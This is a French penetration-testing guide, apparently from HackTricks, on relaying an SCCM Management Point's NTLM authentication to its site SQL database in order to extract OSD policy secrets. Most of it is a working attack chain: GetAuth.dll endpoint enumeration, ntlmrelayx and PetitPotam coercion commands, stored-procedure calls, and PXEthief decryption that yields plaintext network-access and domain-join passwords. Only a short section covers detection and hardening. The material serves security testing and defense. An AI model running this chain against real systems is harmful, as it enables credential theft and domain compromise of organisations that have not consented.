# SCCM Management Point NTLM Relay to SQL – Extraction des secrets de politique OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
En forçant un **System Center Configuration Manager (SCCM) Management Point (MP)** à s'authentifier via SMB/RPC et en **relayant** ce compte machine NTLM vers la **base de données du site (MSSQL)**, vous obtenez des droits `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ces rôles vous permettent d'appeler un ensemble de procédures stockées qui exposent des blobs de politique **Operating System Deployment (OSD)** (identifiants de compte d'accès réseau, variables de séquence de tâches, etc.). Les blobs sont encodés/encryptés en hexadécimal mais peuvent être décodés et décryptés avec **PXEthief**, révélant des secrets en texte clair.

Chaîne de haut niveau :
1. Découvrir MP & base de données du site ↦ point de terminaison HTTP non authentifié `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Démarrer `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forcer MP en utilisant **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. À travers le proxy SOCKS, se connecter avec `mssqlclient.py -windows-auth` en tant que compte relayé **<DOMAIN>\\<MP-host>$**.
5. Exécuter :
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ou `MP_GetPolicyBodyAfterAuthorization`)
6. Supprimer `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Des secrets tels que `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. sont récupérés sans toucher à PXE ou aux clients.

---

## 1. Énumération des points de terminaison MP non authentifiés
L'extension ISAPI MP **GetAuth.dll** expose plusieurs paramètres qui ne nécessitent pas d'authentification (à moins que le site soit uniquement PKI) :

| Paramètre | But |
|-----------|-----|
| `MPKEYINFORMATIONMEDIA` | Renvoie la clé publique du certificat de signature du site + GUIDs des appareils **All Unknown Computers** *x86* / *x64*. |
| `MPLIST` | Liste chaque Management-Point dans le site. |
| `SITESIGNCERT` | Renvoie le certificat de signature du site principal (identifier le serveur de site sans LDAP). |

Récupérez les GUIDs qui serviront d'**clientID** pour les requêtes DB ultérieures :
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relayer le compte machine MP vers MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Lorsque la coercition se déclenche, vous devriez voir quelque chose comme :
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifier les politiques OSD via des procédures stockées
Connectez-vous via le proxy SOCKS (port 1080 par défaut) :
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Passez à la base de données **CM_<SiteCode>** (utilisez le code de site à 3 chiffres, par exemple `CM_001`).

### 3.1  Trouver les GUID d'ordinateur inconnu (optionnel)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lister les politiques assignées
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Chaque ligne contient `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Concentrez-vous sur les politiques :
* **NAAConfig**  – Identifiants du compte d'accès réseau
* **TS_Sequence** – Variables de séquence de tâche (OSDJoinAccount/Password)
* **CollectionSettings** – Peut contenir des comptes d'exécution

### 3.3  Récupérer le corps complet
Si vous avez déjà `PolicyID` & `PolicyVersion`, vous pouvez ignorer l'exigence de clientID en utilisant :
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT : Dans SSMS, augmentez "Maximum Characters Retrieved" (>65535) sinon le blob sera tronqué.

---

## 4. Décoder et déchiffrer le blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Exemple de secrets récupérés :
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Rôles et procédures SQL pertinents
Lors du relais, la connexion est mappée à :
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ces rôles exposent des dizaines de permissions EXEC, les principales utilisées dans cette attaque sont :

| Procédure stockée | But |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lister les politiques appliquées à un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retourner le corps complet de la politique. |
| `MP_GetListOfMPsInSiteOSD` | Retourne par le chemin `MPKEYINFORMATIONMEDIA`. |

Vous pouvez inspecter la liste complète avec :
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Détection & Renforcement
1. **Surveiller les connexions MP** – tout compte d'ordinateur MP se connectant depuis une IP qui n'est pas son hôte ≈ relais.
2. Activer **Protection Étendue pour l'Authentification (EPA)** sur la base de données du site (`PREVENT-14`).
3. Désactiver NTLM inutilisé, appliquer la signature SMB, restreindre RPC (
mêmes atténuations utilisées contre `PetitPotam`/`PrinterBug`).
4. Renforcer la communication MP ↔ DB avec IPSec / mutual-TLS.

---

## Voir aussi
* Fondamentaux du relais NTLM :

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abus MSSQL & post-exploitation :

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Références
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
